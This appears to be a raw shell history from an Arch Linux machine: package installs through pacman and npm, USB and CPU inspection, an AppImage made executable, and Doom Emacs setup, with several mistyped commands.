npm install netlify-cli --save-dev
npm install -g netlify-cli
npm install @infisical/cli --save-dev
npm install -g @infisical/cli
sudo pacman -Ss react
sudo pacman -S react
sudo pacman -S npm
sudo pacman -S fuse
sudo pacman -S libfuse.so.2

chmod +x Cursor-1.0.0-x86_64.AppImage
ls -l  /dev/usb/
ls /dev/usb/
ls /dev/tty
sudo pacman -S usbutils
lame
lkusb
sudo pacman -S lsusb
lscpu
lkbib
usb
./launcher
cd WarThunder/
index_usage
sudo pacman -S jdk21-openjdk
sudo pacman -S java-atk-wrapper-openjdk
java
arduino-ide
sudo pacman -S arduino-ide
pacman -S arduino-ide
st-info
sudo pacman -Ss stlink
sudo pacman -Ss st-util
sudo pacman -Ss osu
pacman -S osu
pacman -Ss osu
ls -l -h
sudo pacman -S wget
sudo pacman -S tmux
sudo pacman -S make
sudo pacman -S cmake
gcc --version
gcc
fetch
sudo pacman -S fetch
echo 'export PATH="$PATH:$HOME/.emacs.d/bin"' >> ~/.bash_profile

cd ~/.emacs.d
./bin/doom install

git clone --depth 1 https://github.com/hlissner/doom-emacs ~/.emacs.d

sudo pacman -S emacs ripgrep git

python version
gdb
sudo pacman -S arm-none-eabi-gcc
sudo pacman -S arm-none-eabi-binutils
whoamio
